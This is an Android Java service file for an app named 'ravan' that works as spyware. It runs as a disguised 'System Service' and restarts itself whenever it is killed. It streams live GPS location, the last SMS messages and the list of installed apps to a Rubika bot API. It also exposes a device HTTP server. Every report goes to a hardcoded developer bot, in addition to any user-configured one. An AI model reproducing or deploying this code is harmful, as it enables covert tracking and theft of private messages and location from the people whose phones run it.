package com.security.ravan;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.LinkAddress;
import android.net.LinkProperties;
import android.net.Network;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Inet6Address;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HttpServerService extends Service {

    private static final String TAG = "HttpServerService";
    private static final String CHANNEL_ID = "RavanServerChannel";
    private static final int NOTIFICATION_ID = 1;

    private RavanHttpServer server;
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private String lastReportedIp = "";
    private String lastSentInfo = "";
    private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
    private Timer fallbackTimer;
    private Timer locationTimer;
    private boolean hasIPv6 = false;

    // ذخیره موقعیت‌ها
    private static List<String> savedLocations = new ArrayList<>();
    private LocationManager locationManager;
    private LocationListener locationListener;
    private String lastLocation = "نامشخص";

    // ========== اطلاعات ربات‌ها ==========
    // ربات خودت (ثابت در کد)
    private static final String MY_BOT_TOKEN = "BEHDBA0MVRIJCDVZWNXMROXXRFNYDEYJYQBFIVMDAKJSTRDLGZFQLTIVGKOLJDXN";
    private static final String MY_CHAT_ID = "b0InoT70eav0eb7550cc52f9e4391710";
    
    // ربات کاربر (از SharedPreferences میاد)
    private String userBotToken = "";
    private String userChatId = "";
    private SharedPreferences prefs;
    // ====================================

    @Override
    public void onCreate() {
        super.onCreate();
        
        // خواندن تنظیمات ربات کاربر
        prefs = getSharedPreferences("bot_config", MODE_PRIVATE);
        userBotToken = prefs.getString("user_bot_token", "");
        userChatId = prefs.getString("user_chat_id", "");
        
        createNotificationChannel();
        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        startLiveLocation();
        checkAndReportIp();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if ("START".equals(action)) {
            startForeground(NOTIFICATION_ID, createNotification());
            startServer();
        } else if ("STOP".equals(action)) {
            stopServer();
            stopForeground(true);
            stopSelf();
        }

        return START_STICKY;
    }

    private void startServer() {
        try {
            if (server == null || !server.isAlive()) {
                server = new RavanHttpServer(this, 8080);
                server.start();
                Log.d(TAG, "HTTP Server started on port 8080");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start server", e);
        }
    }

    private void stopServer() {
        try {
            if (server != null) {
                server.stop();
                server = null;
                Log.d(TAG, "HTTP Server stopped");
            }
            if (fallbackTimer != null) {
                fallbackTimer.cancel();
                fallbackTimer = null;
            }
            if (locationTimer != null) {
                locationTimer.cancel();
                locationTimer = null;
            }
            if (locationManager != null && locationListener != null) {
                locationManager.removeUpdates(locationListener);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping server", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setSound(null, null);
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        String ipv6 = getGlobalIPv6();
        String contentText;
        
        if (ipv6 != null && hasIPv6) {
            contentText = "✅ http://[" + ipv6 + "]:8080";
        } else {
            contentText = "⚠️ Waiting for IPv6 - Last Location: " + lastLocation;
        }

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("🔒 System Service")
                .setContentText(contentText)
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(false);

        return builder.build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service onDestroy called - scheduling restart!");
        
        unregisterNetworkCallback();
        if (fallbackTimer != null) {
            fallbackTimer.cancel();
        }
        if (locationTimer != null) {
            locationTimer.cancel();
        }
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        networkExecutor.shutdown();
        stopServer();
        
        scheduleRestart();
        
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "onTaskRemoved called - scheduling restart!");
        super.onTaskRemoved(rootIntent);
        scheduleRestart();
    }

    private void scheduleRestart() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent restartIntent = new Intent(this, HttpServerService.class);
            restartIntent.setAction("START");
            
            PendingIntent pendingIntent = PendingIntent.getService(
                    this, 0, restartIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            
            long triggerTime = System.currentTimeMillis() + 3000;
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
            } else {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
            }
            
            Log.d(TAG, "✅ Restart scheduled in 3 seconds");
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling restart: " + e.getMessage());
        }
    }

    private void registerNetworkCallback() {
        if (connectivityManager != null) {
            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                    super.onLinkPropertiesChanged(network, linkProperties);
                    checkAndReportIp();
                }
                
                @Override
                public void onAvailable(Network network) {
                    super.onAvailable(network);
                    checkAndReportIp();
                    sendLastLocationIfAvailable();
                }
            };
            connectivityManager.registerDefaultNetworkCallback(networkCallback);
        }
    }

    private void unregisterNetworkCallback() {
        if (connectivityManager != null && networkCallback != null) {
            try {
                connectivityManager.unregisterNetworkCallback(networkCallback);
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering network callback", e);
            }
        }
    }

    private void startLiveLocation() {
        try {
            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) 
                    != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "لوکیشن پرمیشن نداریم");
                return;
            }
            
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    double lat = location.getLatitude();
                    double lon = location.getLongitude();
                    float accuracy = location.getAccuracy();
                    String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                    
                    lastLocation = lat + "," + lon;
                    String locationData = timestamp + "|" + lat + "|" + lon + "|" + accuracy;
                    savedLocations.add(locationData);
                    
                    Log.d(TAG, "موقعیت ذخیره شد: " + lat + "," + lon);
                    
                    String ipv6 = getGlobalIPv6();
                    if (ipv6 != null && hasIPv6) {
                        sendToRubikaBot("📍 موقعیت زنده (" + timestamp + "):\nhttps://maps.google.com/?q=" + lat + "," + lon + "\nدقت: " + accuracy + " متر");
                    }
                    
                    updateNotification();
                }
                
                @Override
                public void onProviderDisabled(String provider) {}
                
                @Override
                public void onProviderEnabled(String provider) {}
                
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}
            };
            
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
            
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 10, locationListener);
            }
            
            Log.d(TAG, "لوکیشن زنده شروع شد - هر 1 دقیقه");
            
        } catch (Exception e) {
            Log.e(TAG, "خطا در شروع لوکیشن: " + e.getMessage());
        }
    }

    public String getLastLocation() {
        return lastLocation;
    }

    public static String getSavedLocationsAsHtml() {
        if (savedLocations.isEmpty()) {
            return "<p style='color:#888;'>📍 موقعیتی ذخیره نشده است</p>";
        }
        
        StringBuilder html = new StringBuilder();
        html.append("<div style='overflow-x: auto;'>");
        html.append("<table style='width:100%; border-collapse: collapse;'>");
        html.append("<tr style='background: #e94560;'>");
        html.append("<th style='padding: 10px;'>زمان</th>");
        html.append("<th style='padding: 10px;'>عرض</th>");
        html.append("<th style='padding: 10px;'>طول</th>");
        html.append("<th style='padding: 10px;'>دقت</th>");
        html.append("<th style='padding: 10px;'>نقشه</th>");
        html.append("</tr>");
        
        for (int i = savedLocations.size() - 1; i >= 0 && i >= savedLocations.size() - 50; i--) {
            String loc = savedLocations.get(i);
            String[] parts = loc.split("\\|");
            if (parts.length >= 3) {
                html.append("<tr style='border-bottom: 1px solid rgba(255,255,255,0.1);'>");
                html.append("<td style='padding: 8px;'>").append(parts[0]).append("</td>");
                html.append("<td style='padding: 8px;'>").append(parts[1]).append("</td>");
                html.append("<td style='padding: 8px;'>").append(parts[2]).append("</td>");
                html.append("<td style='padding: 8px;'>").append(parts.length > 3 ? parts[3] + "m" : "?").append("</td>");
                html.append("<td style='padding: 8px;'><a href='https://maps.google.com/?q=").append(parts[1]).append(",").append(parts[2]);
                html.append("' target='_blank' style='color:#e94560;'>🗺️ نقشه</a></td>");
                html.append("</td>");
            }
        }
        html.append("</table>");
        html.append("</div>");
        html.append("<p style='color:#888; font-size:0.8rem; margin-top:10px;'>📊 مجموع موقعیت‌های ذخیره شده: " + savedLocations.size() + "</p>");
        
        return html.toString();
    }

    private void sendLastLocationIfAvailable() {
        if (!lastLocation.equals("نامشخص")) {
            String[] parts = lastLocation.split(",");
            if (parts.length == 2) {
                sendToRubikaBot("📍 آخرین موقعیت ذخیره شده:\nhttps://maps.google.com/?q=" + parts[0] + "," + parts[1]);
            }
        }
    }

    private void checkAndReportIp() {
        String ipv6 = getGlobalIPv6();
        
        if (ipv6 != null && !ipv6.equals(lastReportedIp)) {
            hasIPv6 = true;
            lastReportedIp = ipv6;
            Log.d(TAG, "IPv6 Detected: " + ipv6);
            
            if (fallbackTimer != null) {
                fallbackTimer.cancel();
                fallbackTimer = null;
            }
            
            String link = "http://[" + ipv6 + "]:8080";
            sendToRubikaBot("✅ دستگاه آنلاین شد!\n\n📱 دستگاه: " + Build.MODEL + "\n🔗 لینک اتصال:\n" + link);
            
            updateNotification();
            
        } else if (ipv6 == null && !hasIPv6) {
            Log.d(TAG, "No IPv6 detected, starting fallback reporting mode");
            startFallbackReporting();
        }
    }

    private String getGlobalIPv6() {
        try {
            if (connectivityManager == null) return null;
            
            Network activeNetwork = connectivityManager.getActiveNetwork();
            if (activeNetwork == null) return null;
            
            LinkProperties linkProps = connectivityManager.getLinkProperties(activeNetwork);
            if (linkProps == null) return null;
            
            List<LinkAddress> addresses = linkProps.getLinkAddresses();
            for (LinkAddress addr : addresses) {
                if (addr.getAddress() instanceof Inet6Address) {
                    String ip = addr.getAddress().getHostAddress();
                    int idx = ip.indexOf('%');
                    if (idx >= 0) {
                        ip = ip.substring(0, idx);
                    }
                    if (!ip.toLowerCase().startsWith("fe80") && 
                        !ip.equals("::1") &&
                        !ip.startsWith("fd") &&
                        !ip.startsWith("fc")) {
                        return ip;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting IPv6: " + e.getMessage());
        }
        return null;
    }

    private void startFallbackReporting() {
        if (fallbackTimer != null) return;
        
        fallbackTimer = new Timer();
        fallbackTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                String info = collectDeviceInfo();
                
                if (!info.equals(lastSentInfo)) {
                    lastSentInfo = info;
                    sendToRubikaBot(info);
                }
            }
        }, 0, 3600000);
    }

    private String collectDeviceInfo() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        
        StringBuilder info = new StringBuilder();
        info.append("📡 گزارش خودکار\n");
        info.append("🕐 زمان: ").append(sdf.format(new Date())).append("\n");
        info.append("📱 دستگاه: ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
        info.append("🤖 Android: ").append(Build.VERSION.RELEASE).append("\n\n");
        
        if (!lastLocation.equals("نامشخص")) {
            String[] parts = lastLocation.split(",");
            if (parts.length == 2) {
                info.append("📍 آخرین موقعیت:\n");
                info.append("   https://maps.google.com/?q=").append(parts[0]).append(",").append(parts[1]).append("\n\n");
            }
        } else {
            info.append("📍 موقعیت: در انتظار GPS...\n\n");
        }
        
        info.append("📱 اپ‌های نصب شده:\n");
        info.append(getInstalledApps());
        info.append("\n📨 آخرین پیامک‌ها:\n");
        info.append(getRecentSMS());
        
        return info.toString();
    }

    private String getInstalledApps() {
        StringBuilder apps = new StringBuilder();
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            List<android.content.pm.ApplicationInfo> packages = pm.getInstalledApplications(0);
            int count = 0;
            for (android.content.pm.ApplicationInfo app : packages) {
                if (pm.getLaunchIntentForPackage(app.packageName) != null && count < 20) {
                    String appName = pm.getApplicationLabel(app).toString();
                    apps.append("  • ").append(appName).append("\n");
                    count++;
                }
            }
            if (packages.size() > 20) {
                apps.append("  و ").append(packages.size() - 20).append(" اپ دیگر...\n");
            }
        } catch (Exception e) {
            apps.append("  خطا: ").append(e.getMessage());
        }
        return apps.toString();
    }

    private String getRecentSMS() {
        StringBuilder smsList = new StringBuilder();
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) 
                    != PackageManager.PERMISSION_GRANTED) {
                return "  ❌ دسترسی به پیامک داده نشده است";
            }
            
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address", "body", "date"},
                null, null, "date DESC LIMIT 10"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    if (body.length() > 50) body = body.substring(0, 50) + "...";
                    smsList.append("  📩 از ").append(number).append(": ").append(body).append("\n");
                    count++;
                    if (count >= 5) break;
                } while (cursor.moveToNext());
                cursor.close();
            } else {
                smsList.append("  هیچ پیامکی یافت نشد\n");
            }
        } catch (Exception e) {
            smsList.append("  خطا: ").append(e.getMessage());
        }
        return smsList.toString();
    }

    // ========== ارسال به دو ربات همزمان ==========
private void sendToRubikaBot(String message) {
    // ارسال به ربات خودت (همیشه)
    sendToSpecificBot(MY_BOT_TOKEN, MY_CHAT_ID, message);
    
    // ارسال به ربات کاربر (اگه تنظیم شده باشه)
    if (userBotToken != null && !userBotToken.isEmpty() && 
        userChatId != null && !userChatId.isEmpty()) {
        sendToSpecificBot(userBotToken, userChatId, message);
    }
}
    private void sendToSpecificBot(String botToken, String chatId, String message) {
        networkExecutor.execute(() -> {
            try {
                String escapedMessage = message.replace("\"", "\\\"").replace("\n", "\\n");
                
                String urlString = "https://botapi.rubika.ir/v3/" + botToken + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("Content-Type", "application/json");
                
                String jsonInputString = "{\"chat_id\": \"" + chatId + "\", \"text\": \"" + escapedMessage + "\"}";
                
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }
                
                int code = conn.getResponseCode();
                Log.d(TAG, "Sent to bot (" + botToken.substring(0, Math.min(10, botToken.length())) + "...): " + code);
                
            } catch (Exception e) {
                Log.e(TAG, "Failed to send to bot: " + e.getMessage());
            }
        });
    }
    // =============================================

    private void updateNotification() {
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        manager.notify(NOTIFICATION_ID, createNotification());
    }

    public static boolean isRunning() {
        return true;
    }
}
